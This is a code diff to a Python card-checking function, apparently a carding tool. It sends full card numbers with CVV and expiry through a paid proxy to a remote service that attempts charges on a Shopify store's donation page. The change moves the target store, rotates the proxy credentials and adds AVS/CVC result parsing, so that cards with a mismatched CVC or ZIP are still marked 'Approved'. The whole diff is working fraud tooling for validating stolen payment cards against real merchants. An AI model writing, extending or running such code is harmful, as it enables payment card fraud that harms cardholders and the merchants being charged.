@@ -8,9 +8,9 @@ async def shopify_func(_, cc, cvv, mes, ano):
         "key": "VDX-SHA2X-NZ0RS-O7HAM",
         "data": {
             "card": fullcc,
-            "product_url": "https://store.longroadsociety.com/products/moses-cadillac-45?variant=12328195358784",
+            "product_url": "https://wcbbstore.com/products/donate",
             "email": None,
-            "proxy": "proxy.speedproxies.net:12321:uipido7851df:6691eddcc9f9_country-us",
+            "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_cuntry-us",
             "ship_address": None,
             "is_shippable": False
         }
@@ -21,11 +21,28 @@ async def shopify_func(_, cc, cvv, mes, ano):
             res = await client.post(url, json=payload)
             response = res.json()
 
-            if response.get("status", "").lower() == "processedreceipt":
-                return {
-                    "status": "Approved ✅",
-                    "response": response.get("message", "Charged successfully")
-                }
+            status = (response.get("status") or "").lower()
+            message = (response.get("message") or "").lower()
+            avs = (response.get("avs_result") or "").lower()
+            cvc = (response.get("cvc_result") or "").lower()
+
+            if status == "processedreceipt":
+                if "fail" in cvc:
+                    return {
+                        "status": "Approved ✅",
+                        "response": "CVC MISMATCH"
+                    }
+                elif "incorrect_zip" in message or "fail" in avs:
+                    return {
+                        "status": "Approved ✅",
+                        "response": "INCORRECT_ZIP"
+                    }
+                else:
+                    return {
+                        "status": "Approved ✅",
+                        "response": response.get("message", "Charged successfully")
+                    }
+
             else:
                 return {
                     "status": "Declined ❌",
